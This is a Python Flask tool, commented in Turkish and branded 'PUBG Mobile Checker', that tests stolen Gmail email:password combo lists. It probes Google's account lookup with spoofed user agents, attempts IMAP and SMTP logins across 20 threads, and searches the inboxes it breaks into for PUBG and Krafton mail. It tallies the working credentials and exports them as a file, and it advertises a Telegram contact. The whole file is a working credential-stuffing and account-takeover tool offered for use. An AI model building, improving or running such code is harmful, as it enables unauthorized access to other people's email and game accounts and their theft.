import os
import re
import json
import time
import random
import requests
import imaplib
import smtplib
import ssl
from flask import Flask, request, jsonify, render_template_string, send_file
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from io import BytesIO

app = Flask(__name__)

# ==================== KONFIGURASYON ====================
CONFIG = {
    "max_workers": 20,
    "timeout": 20,
    "retry_count": 2
}

# ==================== İSTATİSTİKLER ====================
stats = {
    "total_checked": 0,
    "valid_accounts": 0,
    "invalid_accounts": 0,
    "pubg_accounts": 0,
    "results": [],
    "valid_emails": [],
    "start_time": None,
    "last_check": None
}

# ==================== PUBG GÖNDERİCİLER ====================
PUBG_SENDERS = [
    "noreply@pubgmobile.com",
    "no-reply@pubgmobile.com",
    "pubgmobile@news.pubg.com",
    "pubgmobile@info.pubg.com",
    "pubgmobile@promotions.pubg.com",
    "tencentgames.com",
    "levelinfinite.com",
    "krafton.com",
    "noreply@krafton.com"
]

# ==================== USER-AGENT ====================
USER_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

def get_user_agent():
    return random.choice(USER_AGENTS)

# ==================== GERÇEK CHECKER ====================

def check_email_real(email, password):
    """Gerçek email kontrolü - Şifre ile giriş dener"""
    try:
        # 1. Google hesap kontrolü
        url = "https://accounts.google.com/_/signin/sl/lookup"
        headers = {
            "User-Agent": get_user_agent(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Origin": "https://accounts.google.com",
            "Referer": "https://accounts.google.com/",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "no-cache"
        }
        
        data = {
            "Email": email,
            "continue": "https://accounts.google.com/",
            "hl": "en",
            "service": "mail"
        }
        
        response = requests.post(url, data=data, headers=headers, timeout=10, allow_redirects=False)
        text = response.text.lower()
        
        # Hesap var mı kontrol et
        if "couldn't find" in text or "bulunamadı" in text:
            return False, "Hesap bulunamadı", None
        
        # 2. Gerçek giriş dene (IMAP ile)
        try:
            conn = imaplib.IMAP4_SSL("imap.gmail.com", 993)
            conn.login(email, password)
            conn.logout()
            return True, "Giriş başarılı (IMAP)", "✅ Geçerli"
        except imaplib.IMAP4.error as e:
            error = str(e).lower()
            if "authentication failed" in error or "invalid credentials" in error:
                return False, "Şifre hatalı", None
            elif "user unknown" in error:
                return False, "Hesap bulunamadı", None
            else:
                # 3. SMTP ile dene
                try:
                    context = ssl.create_default_context()
                    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context, timeout=10) as server:
                        server.login(email, password)
                        return True, "Giriş başarılı (SMTP)", "✅ Geçerli"
                except:
                    return False, "Giriş başarısız", None
                    
    except Exception as e:
        return False, f"Hata: {str(e)[:50]}", None

def check_pubg_emails(email, password):
    """PUBG maillerini kontrol et - GERÇEK IMAP"""
    try:
        pubg_count = 0
        domain_counts = {}
        found_senders = []
        
        # IMAP ile bağlan
        conn = imaplib.IMAP4_SSL("imap.gmail.com", 993)
        conn.login(email, password)
        conn.select("INBOX")
        
        # PUBG göndericilerini ara
        for sender in PUBG_SENDERS:
            try:
                search_query = f'FROM "{sender}"'
                result, data = conn.search(None, search_query)
                
                if result == 'OK':
                    mail_ids = data[0].split()
                    count = len(mail_ids)
                    if count > 0:
                        domain_counts[sender] = count
                        pubg_count += count
                        found_senders.append(sender)
            except:
                continue
        
        conn.logout()
        
        return {
            "has_pubg": pubg_count > 0,
            "total_count": pubg_count,
            "domain_counts": domain_counts,
            "found_senders": found_senders
        }
        
    except Exception as e:
        return {
            "has_pubg": False,
            "total_count": 0,
            "error": str(e)
        }

def check_single_with_password(email, password):
    """Email + Şifre ile kontrol et"""
    global stats
    
    stats["total_checked"] += 1
    
    # Format kontrol
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        stats["invalid_accounts"] += 1
        return {
            "status": "invalid",
            "email": email,
            "password": password,
            "reason": "Geçersiz format"
        }
    
    # Gerçek kontrol
    is_valid, message, status = check_email_real(email, password)
    
    if is_valid:
        # PUBG kontrolü
        pubg_result = check_pubg_emails(email, password)
        
        result = {
            "status": "valid",
            "email": email,
            "password": password,
            "message": message,
            "pubg": pubg_result
        }
        
        if pubg_result.get("has_pubg", False):
            stats["pubg_accounts"] += 1
            result["type"] = "pubg_mobile"
            result["pubg_count"] = pubg_result.get("total_count", 0)
            result["pubg_senders"] = pubg_result.get("found_senders", [])
        
        stats["valid_accounts"] += 1
        stats["valid_emails"].append({"email": email, "password": password})
        stats["results"].append(result)
        return result
    else:
        stats["invalid_accounts"] += 1
        result = {
            "status": "invalid",
            "email": email,
            "password": password,
            "reason": message
        }
        stats["results"].append(result)
        return result

def check_bulk_with_passwords(accounts):
    """Toplu kontrol - Email + Şifre"""
    results = []
    
    with ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
        futures = []
        for acc in accounts:
            email = acc.get('email', '').strip()
            password = acc.get('password', '').strip()
            if email and password:
                futures.append(executor.submit(check_single_with_password, email, password))
        
        for future in futures:
            try:
                result = future.result(timeout=CONFIG["timeout"] + 5)
                results.append(result)
            except Exception as e:
                results.append({"error": str(e)})
    
    stats["last_check"] = datetime.now().isoformat()
    return results

def check_file_with_passwords(content):
    """Dosyadan kontrol - email:password"""
    accounts = []
    for line in content.strip().split('\n'):
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                email = parts[0].strip()
                password = parts[1].strip()
                if email and password and '@' in email:
                    accounts.append({"email": email, "password": password})
    
    if not accounts:
        return {"error": "Geçerli hesap bulunamadı (email:şifre formatında olmalı)"}
    
    results = check_bulk_with_passwords(accounts)
    return {"results": results, "total": len(results)}

# ==================== HTML ====================

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎯 PUBG Mobile Checker</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
        }
        .container { max-width: 1100px; margin: 0 auto; padding: 20px; }
        
        .header {
            text-align: center;
            padding: 30px 20px;
            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
            border-radius: 16px;
            border: 1px solid #333;
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 48px;
            background: linear-gradient(135deg, #ffd700, #ff6b00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header p { color: #888; margin-top: 10px; }
        .header span { color: #ffd700; }
        .header small { color: #444; font-size: 12px; display: block; margin-top: 5px; }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid #333;
            transition: 0.3s;
        }
        .stat:hover { border-color: #ffd700; transform: translateY(-3px); }
        .stat .num { font-size: 30px; font-weight: bold; }
        .stat .label { color: #888; font-size: 13px; }
        .stat.gold .num { color: #ffd700; }
        .stat.green .num { color: #00ff88; }
        .stat.red .num { color: #ff0044; }
        .stat.blue .num { color: #00d4ff; }
        .stat.orange .num { color: #ff6b00; }
        
        .section {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 25px;
            margin: 20px 0;
            border: 1px solid #333;
        }
        .section h2 {
            color: #ffd700;
            margin-bottom: 15px;
            font-size: 22px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .section h2 .badge {
            font-size: 12px;
            background: #ffd70022;
            color: #ffd700;
            padding: 2px 12px;
            border-radius: 12px;
            border: 1px solid #ffd70044;
        }
        
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 20px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
            flex-wrap: wrap;
        }
        .tab {
            padding: 8px 20px;
            border: none;
            border-radius: 8px;
            background: transparent;
            color: #888;
            cursor: pointer;
            font-size: 14px;
            transition: 0.3s;
        }
        .tab:hover { color: #fff; background: #222; }
        .tab.active {
            background: #ffd70022;
            color: #ffd700;
            border: 1px solid #ffd70044;
        }
        .content { display: none; }
        .content.active { display: block; }
        
        .form-group {
            margin: 15px 0;
        }
        .form-group label {
            color: #888;
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
        }
        .form-group input, .form-group textarea {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #333;
            background: #0a0a0a;
            color: #fff;
            font-size: 14px;
            transition: 0.3s;
        }
        .form-group input:focus, .form-group textarea:focus {
            outline: none;
            border-color: #ffd700;
        }
        .form-group textarea {
            min-height: 100px;
            resize: vertical;
            font-family: monospace;
            font-size: 13px;
        }
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        .btn-primary {
            background: linear-gradient(135deg, #ffd700, #ff6b00);
            color: #000;
        }
        .btn-primary:hover {
            transform: scale(1.02);
            box-shadow: 0 0 25px rgba(255, 215, 0, 0.3);
        }
        .btn-success {
            background: #00ff88;
            color: #000;
        }
        .btn-success:hover {
            transform: scale(1.02);
            box-shadow: 0 0 25px rgba(0, 255, 136, 0.3);
        }
        .btn-danger {
            background: #ff0044;
            color: #fff;
        }
        .btn-danger:hover {
            transform: scale(1.02);
            box-shadow: 0 0 25px rgba(255, 0, 68, 0.3);
        }
        .btn-secondary {
            background: #333;
            color: #fff;
        }
        .btn-secondary:hover {
            background: #444;
        }
        
        .result {
            padding: 10px 15px;
            border-bottom: 1px solid #222;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 5px;
            transition: 0.3s;
        }
        .result:hover { background: #222; }
        .result .email { color: #00d4ff; font-weight: bold; }
        .result .pass { color: #ffd700; font-family: monospace; }
        .result .msg { color: #888; font-size: 12px; }
        .result .pubg-info { color: #ff6b00; font-size: 11px; }
        
        .badge {
            padding: 3px 12px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: bold;
        }
        .badge.valid { background: #00ff8822; color: #00ff88; border: 1px solid #00ff88; }
        .badge.invalid { background: #ff004422; color: #ff0044; border: 1px solid #ff0044; }
        .badge.pubg { background: #ffd70022; color: #ffd700; border: 1px solid #ffd700; }
        
        .results-box {
            max-height: 450px;
            overflow-y: auto;
            border-radius: 8px;
            border: 1px solid #222;
        }
        .results-box::-webkit-scrollbar { width: 6px; }
        .results-box::-webkit-scrollbar-track { background: #0a0a0a; }
        .results-box::-webkit-scrollbar-thumb { background: #ffd700; border-radius: 3px; }
        
        .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }
        .btn-group .btn { flex: 1; min-width: 120px; }
        
        .footer {
            text-align: center;
            padding: 30px;
            color: #555;
            border-top: 1px solid #222;
            margin-top: 30px;
        }
        .footer a { color: #ffd700; text-decoration: none; }
        .footer .telegram { font-size: 14px; }
        .footer .telegram span { color: #ffd700; }
        
        @media (max-width: 600px) {
            .header h1 { font-size: 32px; }
            .stats { grid-template-columns: 1fr 1fr; }
            .form-row { grid-template-columns: 1fr; }
            .btn-group .btn { flex: 1 1 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 PUBG Mobile Checker</h1>
            <p>Gerçek Gmail hesaplarını kontrol et • <span>Şifre ile doğrulama</span></p>
            <small>🔒 IMAP • SMTP • Google API • PUBG Mail Tespiti</small>
        </div>
        
        <div class="stats">
            <div class="stat gold"><div class="num">{{ stats.total_checked }}</div><div class="label">📊 Toplam</div></div>
            <div class="stat green"><div class="num">{{ stats.valid_accounts }}</div><div class="label">✅ Geçerli</div></div>
            <div class="stat red"><div class="num">{{ stats.invalid_accounts }}</div><div class="label">❌ Geçersiz</div></div>
            <div class="stat orange"><div class="num">{{ stats.pubg_accounts }}</div><div class="label">🎮 PUBG</div></div>
            <div class="stat blue"><div class="num">{{ stats.valid_emails|length }}</div><div class="label">📋 Geçerli Mail</div></div>
        </div>
        
        <div class="section">
            <h2>🚀 Hesap Kontrol</h2>
            
            <div class="tabs">
                <button class="tab active" onclick="switchTab('single')">📝 Tek Hesap</button>
                <button class="tab" onclick="switchTab('bulk')">📂 Toplu Kontrol</button>
                <button class="tab" onclick="switchTab('file')">📄 Dosya Yükle</button>
            </div>
            
            <div id="single" class="content active">
                <div class="form-row">
                    <div class="form-group">
                        <label>📧 Gmail</label>
                        <input type="email" id="email" placeholder="ornek@gmail.com">
                    </div>
                    <div class="form-group">
                        <label>🔑 Şifre</label>
                        <input type="password" id="password" placeholder="Şifrenizi girin">
                    </div>
                </div>
                <button class="btn btn-primary" onclick="checkSingle()">🔍 Kontrol Et</button>
            </div>
            
            <div id="bulk" class="content">
                <div class="form-group">
                    <label>📝 Hesaplar (Her satırda email:şifre)</label>
                    <textarea id="accounts" placeholder="ornek1@gmail.com:şifre1&#10;ornek2@gmail.com:şifre2"></textarea>
                </div>
                <button class="btn btn-success" onclick="checkBulk()">🔍 Hepsini Kontrol Et</button>
            </div>
            
            <div id="file" class="content">
                <div class="form-group">
                    <label>📄 Combo Dosyası (email:şifre)</label>
                    <input type="file" id="fileInput" accept=".txt" style="padding:10px;background:#0a0a0a;border:1px solid #333;border-radius:8px;width:100%;">
                </div>
                <button class="btn btn-primary" onclick="checkFile()">📤 Yükle ve Kontrol Et</button>
            </div>
        </div>
        
        <!-- Geçerli Mailleri Göster -->
        {% if stats.valid_emails %}
        <div class="section">
            <h2>
                📋 Geçerli Hesaplar
                <span class="badge">{{ stats.valid_emails|length }} hesap</span>
                <span class="badge" style="background: #ffd70022; color: #ffd700;">
                    🎮 {{ stats.pubg_accounts }} PUBG
                </span>
            </h2>
            
            <div class="btn-group">
                <button class="btn btn-success" onclick="showEmails()">📧 Mailleri Göster</button>
                <button class="btn btn-primary" onclick="exportEmails()">📥 Mailleri İndir</button>
                <button class="btn btn-danger" onclick="clearResults()">🗑️ Temizle</button>
            </div>
            
            <div id="emailList" style="display:none; margin-top:15px;">
                <div class="results-box">
                    {% for item in stats.valid_emails %}
                    <div class="result">
                        <span>
                            <span class="email">{{ item.email }}</span>
                            <span style="color:#555;">|</span>
                            <span class="pass">{{ item.password }}</span>
                        </span>
                        <span>
                            {% if item.pubg %}
                                <span class="badge pubg">🎮 PUBG</span>
                            {% else %}
                                <span class="badge valid">✅ Geçerli</span>
                            {% endif %}
                        </span>
                    </div>
                    {% endfor %}
                </div>
            </div>
        </div>
        {% endif %}
        
        <!-- Tüm Sonuçlar -->
        {% if stats.results %}
        <div class="section">
            <h2>
                📊 Tüm Sonuçlar
                <span class="badge">{{ stats.results|length }} hesap</span>
            </h2>
            <div class="results-box">
                {% for r in stats.results[:50] %}
                <div class="result">
                    <span>
                        <span class="email">{{ r.get('email', 'N/A') }}</span>
                        {% if r.get('password') %}
                        <span style="color:#555;">|</span>
                        <span class="pass">{{ r.get('password') }}</span>
                        {% endif %}
                        <span class="msg">{{ r.get('message', '') }}{{ r.get('reason', '') }}</span>
                        {% if r.get('pubg_count', 0) > 0 %}
                        <span class="pubg-info">📬 {{ r.get('pubg_count') }} PUBG mail</span>
                        {% endif %}
                    </span>
                    <span>
                        {% if r.get('status') == 'valid' %}
                            {% if r.get('type') == 'pubg_mobile' %}
                                <span class="badge pubg">🎮 PUBG</span>
                            {% else %}
                                <span class="badge valid">✅ Geçerli</span>
                            {% endif %}
                        {% else %}
                            <span class="badge invalid">❌ Geçersiz</span>
                        {% endif %}
                    </span>
                </div>
                {% endfor %}
            </div>
        </div>
        {% endif %}
        
        <div class="footer">
            <p class="telegram">📞✈️ Telegram: <a href="https://t.me/rinexdestek" target="_blank"><span>@rinexdestek</span></a></p>
            <p style="font-size:12px;color:#444;">v9.0 • Gerçek Gmail Checker • PUBG Mobile Tespiti</p>
        </div>
    </div>
    
    <script>
        function switchTab(tab) {
            document.querySelectorAll('.content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
            document.getElementById(tab).classList.add('active');
            event.target.classList.add('active');
        }
        
        function showEmails() {
            const list = document.getElementById('emailList');
            if (list.style.display === 'none') {
                list.style.display = 'block';
                event.target.textContent = '📧 Mailleri Gizle';
            } else {
                list.style.display = 'none';
                event.target.textContent = '📧 Mailleri Göster';
            }
        }
        
        async function exportEmails() {
            try {
                const res = await fetch('/api/export');
                if (res.ok) {
                    const blob = await res.blob();
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'valid_emails.txt';
                    a.click();
                } else {
                    alert('❌ Hata: ' + (await res.text()));
                }
            } catch(e) {
                alert('❌ Hata: ' + e);
            }
        }
        
        async function clearResults() {
            if (!confirm('Tüm sonuçlar silinsin mi?')) return;
            try {
                await fetch('/api/reset', { method: 'POST' });
                location.reload();
            } catch(e) {
                alert('❌ Hata: ' + e);
            }
        }
        
        async function checkSingle() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!email || !password) {
                alert('Email ve şifre girin!');
                return;
            }
            
            const btn = event.target;
            btn.textContent = '⏳ Kontrol ediliyor...';
            btn.disabled = true;
            
            try {
                const res = await fetch('/api/check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                const data = await res.json();
                if (data.success) {
                    const result = data.result;
                    let msg = '📧 ' + email + '\n';
                    msg += result.status === 'valid' ? '✅ GEÇERLİ\n' : '❌ GEÇERSİZ\n';
                    msg += result.message || result.reason || '';
                    if (result.pubg && result.pubg.has_pubg) {
                        msg += '\n🎮 PUBG MOBILE BULUNDU!';
                        msg += '\n📬 ' + result.pubg.total_count + ' PUBG mail';
                    }
                    alert(msg);
                } else {
                    alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
                }
                location.reload();
            } catch(e) {
                alert('❌ Hata: ' + e);
            } finally {
                btn.textContent = '🔍 Kontrol Et';
                btn.disabled = false;
            }
        }
        
        async function checkBulk() {
            const text = document.getElementById('accounts').value.trim();
            if (!text) {
                alert('Hesapları girin!');
                return;
            }
            
            const accounts = text.split('\\n').map(l => l.trim()).filter(l => l && ':' in l);
            if (!accounts.length) {
                alert('Geçerli hesap bulunamadı (email:şifre)');
                return;
            }
            
            const btn = event.target;
            btn.textContent = '⏳ ' + accounts.length + ' hesap kontrol ediliyor...';
            btn.disabled = true;
            
            try {
                const res = await fetch('/api/check-bulk', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ accounts })
                });
                const data = await res.json();
                if (data.success) {
                    alert('✅ ' + accounts.length + ' hesap kontrol edildi!\\n' +
                          '✅ Geçerli: ' + data.valid_count + '\\n' +
                          '🎮 PUBG: ' + data.pubg_count + '\\n' +
                          '❌ Geçersiz: ' + (data.total - data.valid_count));
                } else {
                    alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
                }
                location.reload();
            } catch(e) {
                alert('❌ Hata: ' + e);
            } finally {
                btn.textContent = '🔍 Hepsini Kontrol Et';
                btn.disabled = false;
            }
        }
        
        async function checkFile() {
            const fileInput = document.getElementById('fileInput');
            const file = fileInput.files[0];
            if (!file) {
                alert('Dosya seçin!');
                return;
            }
            
            const reader = new FileReader();
            reader.onload = async function(e) {
                const btn = event.target;
                btn.textContent = '⏳ Dosya kontrol ediliyor...';
                btn.disabled = true;
                
                try {
                    const res = await fetch('/api/check-file', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ file_content: e.target.result })
                    });
                    const data = await res.json();
                    if (data.success) {
                        alert('✅ Dosya kontrol edildi!\\n' +
                              '📊 Toplam: ' + data.total + '\\n' +
                              '✅ Geçerli: ' + data.valid_count + '\\n' +
                              '🎮 PUBG: ' + data.pubg_count);
                    } else {
                        alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
                    }
                    location.reload();
                } catch(err) {
                    alert('❌ Hata: ' + err);
                } finally {
                    btn.textContent = '📤 Yükle ve Kontrol Et';
                    btn.disabled = false;
                }
            };
            reader.readAsText(file);
        }
    </script>
</body>
</html>
"""

# ==================== ROUTES ====================

@app.route('/')
def index():
    return render_template_string(HTML, stats=stats)

@app.route('/api/status')
def status():
    return jsonify({
        "status": "online",
        "stats": {
            "total": stats["total_checked"],
            "valid": stats["valid_accounts"],
            "invalid": stats["invalid_accounts"],
            "pubg": stats["pubg_accounts"],
            "valid_emails": len(stats["valid_emails"])
        }
    })

@app.route('/api/check', methods=['POST'])
def api_check():
    try:
        data = request.get_json()
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        if not email or not password:
            return jsonify({"error": "email and password required"}), 400
        
        result = check_single_with_password(email, password)
        return jsonify({"success": True, "result": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-bulk', methods=['POST'])
def api_bulk():
    try:
        data = request.get_json()
        accounts = data.get('accounts', [])
        if not accounts:
            return jsonify({"error": "accounts required"}), 400
        
        if len(accounts) > 50:
            return jsonify({"error": "Max 50 accounts"}), 400
        
        results = check_bulk_with_passwords(accounts)
        valid = sum(1 for r in results if r.get('status') == 'valid')
        pubg = sum(1 for r in results if r.get('type') == 'pubg_mobile')
        
        return jsonify({
            "success": True,
            "total": len(results),
            "valid_count": valid,
            "pubg_count": pubg,
            "results": results
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-file', methods=['POST'])
def api_file():
    try:
        data = request.get_json()
        content = data.get('file_content', '')
        if not content:
            return jsonify({"error": "content required"}), 400
        
        result = check_file_with_passwords(content)
        if "error" in result:
            return jsonify({"error": result["error"]}), 400
        
        valid = sum(1 for r in result["results"] if r.get('status') == 'valid')
        pubg = sum(1 for r in result["results"] if r.get('type') == 'pubg_mobile')
        
        return jsonify({
            "success": True,
            "total": result["total"],
            "valid_count": valid,
            "pubg_count": pubg,
            "results": result["results"]
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/export', methods=['GET'])
def export():
    try:
        valid_emails = []
        for item in stats["valid_emails"]:
            email = item.get('email', '')
            password = item.get('password', '')
            if email and password:
                valid_emails.append(f"{email}:{password}")
        
        if not valid_emails:
            return jsonify({"error": "Geçerli hesap bulunamadı"}), 404
        
        content = "\n".join(valid_emails)
        return send_file(
            BytesIO(content.encode('utf-8')),
            mimetype='text/plain',
            as_attachment=True,
            download_name=f'valid_accounts_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
        )
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/reset', methods=['POST'])
def reset():
    global stats
    stats = {
        "total_checked": 0,
        "valid_accounts": 0,
        "invalid_accounts": 0,
        "pubg_accounts": 0,
        "results": [],
        "valid_emails": [],
        "start_time": datetime.now(),
        "last_check": None
    }
    return jsonify({"success": True})

# ==================== MAIN ====================

if __name__ == "__main__":
    stats["start_time"] = datetime.now()
    port = int(os.environ.get("PORT", 5000))
    
    print("=" * 60)
    print("🎯 PUBG Mobile Checker API Başlatıldı")
    print("=" * 60)
    print(f"📡 Port: {port}")
    print(f"⚡ Max Workers: {CONFIG['max_workers']}")
    print("🔒 Gerçek Gmail Kontrolü: Aktif")
    print("🎮 PUBG Mobile Tespiti: Aktif")
    print("📞✈️ Telegram: @rinexdestek")
    print("=" * 60)
    
    app.run(host="0.0.0.0", port=port, debug=False)
